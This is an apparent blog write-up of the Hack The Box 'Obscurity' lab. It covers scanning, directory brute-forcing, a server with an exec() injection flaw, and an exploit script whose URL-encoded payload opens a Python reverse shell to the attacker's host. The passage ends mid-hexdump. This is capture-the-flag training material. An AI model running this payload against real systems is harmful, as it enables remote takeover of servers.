<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>HTB-Obscurity writeup - 菜鸟程序员博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="HTB-Obscurity writeup" />
<meta property="og:description" content="文章目录 前言0x1 www-data0x2 user flag0x3 root flag0x4 总结 前言 这是HTB系列的第二篇，第一篇链接地址：https://blog.csdn.net/weixin_43826280/article/details/103943571
准备
Obscurity靶机地址：10.10.10.168OS:Linux
难度：中等
操作机：Kali
将靶机的ip地址加入到hosts文件中
10.10.10.168 obscurity.htb 0x1 www-data nmap扫描
# Nmap 7.80 scan initiated Wed Jan 15 14:08:44 2020 as: nmap -sVTC -o scan 10.10.10.168 Nmap scan report for obsecurity.htb (10.10.10.168) Host is up (0.28s latency). Not shown: 998 filtered ports PORT STATE SERVICE VERSION 8080/tcp open http-proxy BadHTTPServer | fingerprint-strings: | GetRequest: | HTTP/1.1 200 OK | Date: Wed, 15 Jan 2020 06:10:46 | Server: BadHTTPServer | Last-Modified: Wed, 15 Jan 2020 06:10:46 | Content-Length: 4171 | Content-Type: text/html | Connection: Closed ." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://cainiaoprogram.github.io/posts/02145fc93d8675d67cacae30191c33ba/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2020-02-05T12:14:14+08:00" />
<meta property="article:modified_time" content="2020-02-05T12:14:14+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="菜鸟程序员博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">菜鸟程序员博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">HTB-Obscurity writeup</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-atom-one-light">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <p></p> 
<div class="toc"> 
 <h4>文章目录</h4> 
 <ul><li><ul><li><a href="#_2" rel="nofollow">前言</a></li><li><a href="#0x1_wwwdata_16" rel="nofollow">0x1 www-data</a></li><li><a href="#0x2_user_flag_252" rel="nofollow">0x2 user flag</a></li><li><a href="#0x3_root_flag_439" rel="nofollow">0x3 root flag</a></li><li><a href="#0x4__534" rel="nofollow">0x4 总结</a></li></ul> 
 </li></ul> 
</div> 
<p></p> 
<h3><a id="_2"></a>前言</h3> 
<p>这是HTB系列的第二篇，第一篇链接地址：<a href="https://blog.csdn.net/weixin_43826280/article/details/103943571">https://blog.csdn.net/weixin_43826280/article/details/103943571</a></p> 
<p><strong>准备</strong><br> Obscurity靶机地址：10.10.10.168OS:Linux<br> 难度：中等<br> 操作机：Kali<br> <img src="https://images2.imgbox.com/60/c1/hS44p9gN_o.png" alt="在这里插入图片描述"><br> 将靶机的ip地址加入到hosts文件中</p> 
<pre><code>10.10.10.168 obscurity.htb
</code></pre> 
<h3><a id="0x1_wwwdata_16"></a>0x1 www-data</h3> 
<p>nmap扫描</p> 
<pre><code># Nmap 7.80 scan initiated Wed Jan 15 14:08:44 2020 as: nmap -sVTC -o scan 10.10.10.168
Nmap scan report for obsecurity.htb (10.10.10.168)
Host is up (0.28s latency).
Not shown: 998 filtered ports
PORT     STATE  SERVICE    VERSION
8080/tcp open   http-proxy BadHTTPServer
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Wed, 15 Jan 2020 06:10:46
|     Server: BadHTTPServer
|     Last-Modified: Wed, 15 Jan 2020 06:10:46
|     Content-Length: 4171
|     Content-Type: text/html
|     Connection: Closed
..
|_http-server-header: BadHTTPServer
|_http-title: 0bscura
9000/tcp closed cslistener
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :

</code></pre> 
<p>扫描出8080和9000端口。浏览器访问8080端口<br> <img src="https://images2.imgbox.com/20/62/3KWtYhsO_o.png" alt="在这里插入图片描述"><br> 页面提示在某个目录中有SuperSecureServer.py文件，因此需要先爆破出目录。</p> 
<p>使用wfuzz扫描目录</p> 
<pre><code class="prism language-sh">wfuzz -c -z file,medium.txt -u http://obscurity.htb:8080/FUZZ/SuperSecureServer.py 
</code></pre> 
<p>扫出develop目录<br> <img src="https://images2.imgbox.com/06/69/zBlLW3v2_o.png" alt="在这里插入图片描述"><br> wget下载py文件</p> 
<pre><code class="prism language-sh">wget  http://obscurity.htb:8080/develop/SuperSecureServer.py
</code></pre> 
<p>该文件如下：</p> 
<pre><code class="prism language-python"><span class="token keyword">import</span> socket
<span class="token keyword">import</span> threading
<span class="token keyword">from</span> datetime <span class="token keyword">import</span> datetime
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> os
<span class="token keyword">import</span> mimetypes
<span class="token keyword">import</span> urllib<span class="token punctuation">.</span>parse
<span class="token keyword">import</span> subprocess

respTemplate <span class="token operator">=</span> <span class="token triple-quoted-string string">"""HTTP/1.1 {statusNum} {statusCode}
Date: {dateSent}
Server: {server}
Last-Modified: {modified}
Content-Length: {length}
Content-Type: {contentType}
Connection: {connectionType}

{body}
"""</span>
DOC_ROOT <span class="token operator">=</span> <span class="token string">"DocRoot"</span>

CODES <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span><span class="token string">"200"</span><span class="token punctuation">:</span> <span class="token string">"OK"</span><span class="token punctuation">,</span> 
        <span class="token string">"304"</span><span class="token punctuation">:</span> <span class="token string">"NOT MODIFIED"</span><span class="token punctuation">,</span>
        <span class="token string">"400"</span><span class="token punctuation">:</span> <span class="token string">"BAD REQUEST"</span><span class="token punctuation">,</span> <span class="token string">"401"</span><span class="token punctuation">:</span> <span class="token string">"UNAUTHORIZED"</span><span class="token punctuation">,</span> <span class="token string">"403"</span><span class="token punctuation">:</span> <span class="token string">"FORBIDDEN"</span><span class="token punctuation">,</span> <span class="token string">"404"</span><span class="token punctuation">:</span> <span class="token string">"NOT FOUND"</span><span class="token punctuation">,</span> 
        <span class="token string">"500"</span><span class="token punctuation">:</span> <span class="token string">"INTERNAL SERVER ERROR"</span><span class="token punctuation">}</span>

MIMES <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span><span class="token string">"txt"</span><span class="token punctuation">:</span> <span class="token string">"text/plain"</span><span class="token punctuation">,</span> <span class="token string">"css"</span><span class="token punctuation">:</span><span class="token string">"text/css"</span><span class="token punctuation">,</span> <span class="token string">"html"</span><span class="token punctuation">:</span><span class="token string">"text/html"</span><span class="token punctuation">,</span> <span class="token string">"png"</span><span class="token punctuation">:</span> <span class="token string">"image/png"</span><span class="token punctuation">,</span> <span class="token string">"jpg"</span><span class="token punctuation">:</span><span class="token string">"image/jpg"</span><span class="token punctuation">,</span> 
        <span class="token string">"ttf"</span><span class="token punctuation">:</span><span class="token string">"application/octet-stream"</span><span class="token punctuation">,</span><span class="token string">"otf"</span><span class="token punctuation">:</span><span class="token string">"application/octet-stream"</span><span class="token punctuation">,</span> <span class="token string">"woff"</span><span class="token punctuation">:</span><span class="token string">"font/woff"</span><span class="token punctuation">,</span> <span class="token string">"woff2"</span><span class="token punctuation">:</span> <span class="token string">"font/woff2"</span><span class="token punctuation">,</span> 
        <span class="token string">"js"</span><span class="token punctuation">:</span><span class="token string">"application/javascript"</span><span class="token punctuation">,</span><span class="token string">"gz"</span><span class="token punctuation">:</span><span class="token string">"application/zip"</span><span class="token punctuation">,</span> <span class="token string">"py"</span><span class="token punctuation">:</span><span class="token string">"text/plain"</span><span class="token punctuation">,</span> <span class="token string">"map"</span><span class="token punctuation">:</span> <span class="token string">"application/octet-stream"</span><span class="token punctuation">}</span>


<span class="token keyword">class</span> <span class="token class-name">Response</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>__dict__<span class="token punctuation">.</span>update<span class="token punctuation">(</span>kwargs<span class="token punctuation">)</span>
        now <span class="token operator">=</span> datetime<span class="token punctuation">.</span>now<span class="token punctuation">(</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>dateSent <span class="token operator">=</span> self<span class="token punctuation">.</span>modified <span class="token operator">=</span> now<span class="token punctuation">.</span>strftime<span class="token punctuation">(</span><span class="token string">"%a, %d %b %Y %H:%M:%S"</span><span class="token punctuation">)</span>
    <span class="token keyword">def</span> <span class="token function">stringResponse</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> respTemplate<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token operator">**</span>self<span class="token punctuation">.</span>__dict__<span class="token punctuation">)</span>

<span class="token keyword">class</span> <span class="token class-name">Request</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> request<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>good <span class="token operator">=</span> <span class="token boolean">True</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            request <span class="token operator">=</span> self<span class="token punctuation">.</span>parseRequest<span class="token punctuation">(</span>request<span class="token punctuation">)</span>
            self<span class="token punctuation">.</span>method <span class="token operator">=</span> request<span class="token punctuation">[</span><span class="token string">"method"</span><span class="token punctuation">]</span>
            self<span class="token punctuation">.</span>doc <span class="token operator">=</span> request<span class="token punctuation">[</span><span class="token string">"doc"</span><span class="token punctuation">]</span>
            self<span class="token punctuation">.</span>vers <span class="token operator">=</span> request<span class="token punctuation">[</span><span class="token string">"vers"</span><span class="token punctuation">]</span>
            self<span class="token punctuation">.</span>header <span class="token operator">=</span> request<span class="token punctuation">[</span><span class="token string">"header"</span><span class="token punctuation">]</span>
            self<span class="token punctuation">.</span>body <span class="token operator">=</span> request<span class="token punctuation">[</span><span class="token string">"body"</span><span class="token punctuation">]</span>
        <span class="token keyword">except</span><span class="token punctuation">:</span>
            self<span class="token punctuation">.</span>good <span class="token operator">=</span> <span class="token boolean">False</span>

    <span class="token keyword">def</span> <span class="token function">parseRequest</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> request<span class="token punctuation">)</span><span class="token punctuation">:</span>        
        req <span class="token operator">=</span> request<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">"\r"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span>
        method<span class="token punctuation">,</span>doc<span class="token punctuation">,</span>vers <span class="token operator">=</span> req<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span>
        header <span class="token operator">=</span> req<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">]</span>
        body <span class="token operator">=</span> req<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
        headerDict <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span><span class="token punctuation">}</span>
        <span class="token keyword">for</span> param <span class="token keyword">in</span> header<span class="token punctuation">:</span>
            pos <span class="token operator">=</span> param<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">": "</span><span class="token punctuation">)</span>
            key<span class="token punctuation">,</span> val <span class="token operator">=</span> param<span class="token punctuation">[</span><span class="token punctuation">:</span>pos<span class="token punctuation">]</span><span class="token punctuation">,</span> param<span class="token punctuation">[</span>pos<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
            headerDict<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">{<!-- --></span>key<span class="token punctuation">:</span> val<span class="token punctuation">}</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token punctuation">{<!-- --></span><span class="token string">"method"</span><span class="token punctuation">:</span> method<span class="token punctuation">,</span> <span class="token string">"doc"</span><span class="token punctuation">:</span> doc<span class="token punctuation">,</span> <span class="token string">"vers"</span><span class="token punctuation">:</span> vers<span class="token punctuation">,</span> <span class="token string">"header"</span><span class="token punctuation">:</span> headerDict<span class="token punctuation">,</span> <span class="token string">"body"</span><span class="token punctuation">:</span> body<span class="token punctuation">}</span>


<span class="token keyword">class</span> <span class="token class-name">Server</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">:</span>    
        self<span class="token punctuation">.</span>host <span class="token operator">=</span> host
        self<span class="token punctuation">.</span>port <span class="token operator">=</span> port
        self<span class="token punctuation">.</span>sock <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>sock<span class="token punctuation">.</span>setsockopt<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>SOL_SOCKET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SO_REUSEADDR<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>sock<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>host<span class="token punctuation">,</span> self<span class="token punctuation">.</span>port<span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">listen</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>sock<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>
        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
            client<span class="token punctuation">,</span> address <span class="token operator">=</span> self<span class="token punctuation">.</span>sock<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span>
            client<span class="token punctuation">.</span>settimeout<span class="token punctuation">(</span><span class="token number">60</span><span class="token punctuation">)</span>
            threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target <span class="token operator">=</span> self<span class="token punctuation">.</span>listenToClient<span class="token punctuation">,</span>args <span class="token operator">=</span> <span class="token punctuation">(</span>client<span class="token punctuation">,</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">listenToClient</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> client<span class="token punctuation">,</span> address<span class="token punctuation">)</span><span class="token punctuation">:</span>
        size <span class="token operator">=</span> <span class="token number">1024</span>
        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
            <span class="token keyword">try</span><span class="token punctuation">:</span>
                data <span class="token operator">=</span> client<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>size<span class="token punctuation">)</span>
                <span class="token keyword">if</span> data<span class="token punctuation">:</span>
                    <span class="token comment"># Set the response to echo back the recieved data </span>
                    req <span class="token operator">=</span> Request<span class="token punctuation">(</span>data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment">#解码</span>
                    self<span class="token punctuation">.</span>handleRequest<span class="token punctuation">(</span>req<span class="token punctuation">,</span> client<span class="token punctuation">,</span> address<span class="token punctuation">)</span>   
                    client<span class="token punctuation">.</span>shutdown<span class="token punctuation">(</span><span class="token punctuation">)</span>
                    client<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
                <span class="token keyword">else</span><span class="token punctuation">:</span>
                    <span class="token keyword">raise</span> error<span class="token punctuation">(</span><span class="token string">'Client disconnected'</span><span class="token punctuation">)</span>
            <span class="token keyword">except</span><span class="token punctuation">:</span>
                client<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
                <span class="token keyword">return</span> <span class="token boolean">False</span>
    
    <span class="token keyword">def</span> <span class="token function">handleRequest</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> request<span class="token punctuation">,</span> conn<span class="token punctuation">,</span> address<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> request<span class="token punctuation">.</span>good<span class="token punctuation">:</span>
<span class="token comment">#            try:</span>
                <span class="token comment"># print(str(request.method) + " " + str(request.doc), end=' ')</span>
                <span class="token comment"># print("from {0}".format(address[0]))</span>
<span class="token comment">#            except Exception as e:</span>
<span class="token comment">#                print(e)</span>
            document <span class="token operator">=</span> self<span class="token punctuation">.</span>serveDoc<span class="token punctuation">(</span>request<span class="token punctuation">.</span>doc<span class="token punctuation">,</span> DOC_ROOT<span class="token punctuation">)</span>
            statusNum<span class="token operator">=</span>document<span class="token punctuation">[</span><span class="token string">"status"</span><span class="token punctuation">]</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            document <span class="token operator">=</span> self<span class="token punctuation">.</span>serveDoc<span class="token punctuation">(</span><span class="token string">"/errors/400.html"</span><span class="token punctuation">,</span> DOC_ROOT<span class="token punctuation">)</span>
            statusNum<span class="token operator">=</span><span class="token string">"400"</span>
        body <span class="token operator">=</span> document<span class="token punctuation">[</span><span class="token string">"body"</span><span class="token punctuation">]</span>
        
        statusCode<span class="token operator">=</span>CODES<span class="token punctuation">[</span>statusNum<span class="token punctuation">]</span>
        dateSent <span class="token operator">=</span> <span class="token string">""</span>
        server <span class="token operator">=</span> <span class="token string">"BadHTTPServer"</span>
        modified <span class="token operator">=</span> <span class="token string">""</span>
        length <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>body<span class="token punctuation">)</span>
        contentType <span class="token operator">=</span> document<span class="token punctuation">[</span><span class="token string">"mime"</span><span class="token punctuation">]</span> <span class="token comment"># Try and identify MIME type from string</span>
        connectionType <span class="token operator">=</span> <span class="token string">"Closed"</span>


        resp <span class="token operator">=</span> Response<span class="token punctuation">(</span>
        statusNum<span class="token operator">=</span>statusNum<span class="token punctuation">,</span> statusCode<span class="token operator">=</span>statusCode<span class="token punctuation">,</span> 
        dateSent <span class="token operator">=</span> dateSent<span class="token punctuation">,</span> server <span class="token operator">=</span> server<span class="token punctuation">,</span> 
        modified <span class="token operator">=</span> modified<span class="token punctuation">,</span> length <span class="token operator">=</span> length<span class="token punctuation">,</span> 
        contentType <span class="token operator">=</span> contentType<span class="token punctuation">,</span> connectionType <span class="token operator">=</span> connectionType<span class="token punctuation">,</span> 
        body <span class="token operator">=</span> body
        <span class="token punctuation">)</span>

        data <span class="token operator">=</span> resp<span class="token punctuation">.</span>stringResponse<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token operator">not</span> data<span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span>
        conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token number">0</span>

    <span class="token keyword">def</span> <span class="token function">serveDoc</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> path<span class="token punctuation">,</span> docRoot<span class="token punctuation">)</span><span class="token punctuation">:</span>
        path <span class="token operator">=</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>path<span class="token punctuation">)</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            info <span class="token operator">=</span> <span class="token string">"output = 'Document: {}'"</span> <span class="token comment"># Keep the output for later debug</span>
            <span class="token keyword">exec</span><span class="token punctuation">(</span>info<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># This is how you do string formatting, right?</span>
            cwd <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>realpath<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">)</span>
            docRoot <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>cwd<span class="token punctuation">,</span> docRoot<span class="token punctuation">)</span>
            <span class="token keyword">if</span> path <span class="token operator">==</span> <span class="token string">"/"</span><span class="token punctuation">:</span>
                path <span class="token operator">=</span> <span class="token string">"/index.html"</span>
            requested <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>docRoot<span class="token punctuation">,</span> path<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>isfile<span class="token punctuation">(</span>requested<span class="token punctuation">)</span><span class="token punctuation">:</span>
                mime <span class="token operator">=</span> mimetypes<span class="token punctuation">.</span>guess_type<span class="token punctuation">(</span>requested<span class="token punctuation">)</span>
                mime <span class="token operator">=</span> <span class="token punctuation">(</span>mime <span class="token keyword">if</span> mime<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token boolean">None</span> <span class="token keyword">else</span> <span class="token string">"text/html"</span><span class="token punctuation">)</span>
                mime <span class="token operator">=</span> MIMES<span class="token punctuation">[</span>requested<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
                <span class="token keyword">try</span><span class="token punctuation">:</span>
                    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>requested<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
                        data <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
                <span class="token keyword">except</span><span class="token punctuation">:</span>
                    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>requested<span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
                        data <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
                status <span class="token operator">=</span> <span class="token string">"200"</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                errorPage <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>docRoot<span class="token punctuation">,</span> <span class="token string">"errors"</span><span class="token punctuation">,</span> <span class="token string">"404.html"</span><span class="token punctuation">)</span>
                mime <span class="token operator">=</span> <span class="token string">"text/html"</span>
                <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>errorPage<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
                    data <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span>
                status <span class="token operator">=</span> <span class="token string">"404"</span>
        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>
            errorPage <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>docRoot<span class="token punctuation">,</span> <span class="token string">"errors"</span><span class="token punctuation">,</span> <span class="token string">"500.html"</span><span class="token punctuation">)</span>
            mime <span class="token operator">=</span> <span class="token string">"text/html"</span>
            <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>errorPage<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
                data <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
            status <span class="token operator">=</span> <span class="token string">"500"</span>
        <span class="token keyword">return</span> <span class="token punctuation">{<!-- --></span><span class="token string">"body"</span><span class="token punctuation">:</span> data<span class="token punctuation">,</span> <span class="token string">"mime"</span><span class="token punctuation">:</span> mime<span class="token punctuation">,</span> <span class="token string">"status"</span><span class="token punctuation">:</span> status<span class="token punctuation">}</span>
</code></pre> 
<p>通过分析发现，程序漏洞点在于serveDoc中的exec函数，该函数未对用户的输入path进行判断就被执行，再结合python format漏洞可导致RCE。</p> 
<p>构造exp.py</p> 
<pre><code class="prism language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> urllib
<span class="token keyword">import</span> os

url <span class="token operator">=</span> <span class="token string">'http://10.10.10.168:8080/'</span>

path<span class="token operator">=</span><span class="token string">'5\''</span><span class="token operator">+</span><span class="token string">'\nimport socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.XX.XXX",9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"])\na=\''</span>

payload <span class="token operator">=</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>path<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"payload"</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>url<span class="token operator">+</span>payload<span class="token punctuation">)</span>

r<span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span>payload<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>headers<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
</code></pre> 
<p>在本地使用nc监听9999端口，执行脚本后得到反弹shell。<br> <img src="https://images2.imgbox.com/b7/49/KaLzsOaa_o.png" alt="在这里插入图片描述"></p> 
<h3><a id="0x2_user_flag_252"></a>0x2 user flag</h3> 
<p>进入/home目录，发现只有一个robert用户文件夹，进入robert查看用户文件：<br> <img src="https://images2.imgbox.com/dc/8b/xCB63yEE_o.png" alt="在这里插入图片描述"><br> 经过分析，BetterSSH目录应该是模拟SSH登录，暂时还用不到。查看其余文件：<br> check.txt</p> 
<pre><code class="prism language-bash">www-data@obscure:/home/robert$ <span class="token function">cat</span> check.txt
<span class="token function">cat</span> check.txt
Encrypting this <span class="token function">file</span> with your key should result <span class="token keyword">in</span> out.txt, <span class="token function">make</span> sure your key is correct<span class="token operator">!</span>
</code></pre> 
<p>out.txt</p> 
<pre><code class="prism language-bash">www-data@obscure:/home/robert$ hd out.txt
hd out.txt
00000000  c2 a6 c3 9a c3 88 c3 aa  c3 9a c3 9e c3 98 c3 9b  <span class="token operator">|</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token operator">|</span>
00000010  c3 9d c3 9d c2 89 c3 97  c3 90 c3 8a c3 9f c2 85  <span class="token operator">|</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token operator">|</span>
00000020  c3 9e c3 8a c3 9a c3 89  c2 92 c3 a6 c3 9f c3 9d  <span class="token operator">|</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token operator">|</span>
00000030  c3 8b c2 88 c3 9a c3 9b  c3 9a c3 aa c2 81 c3 99  <span class="token operator">|</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token operator">|</span>
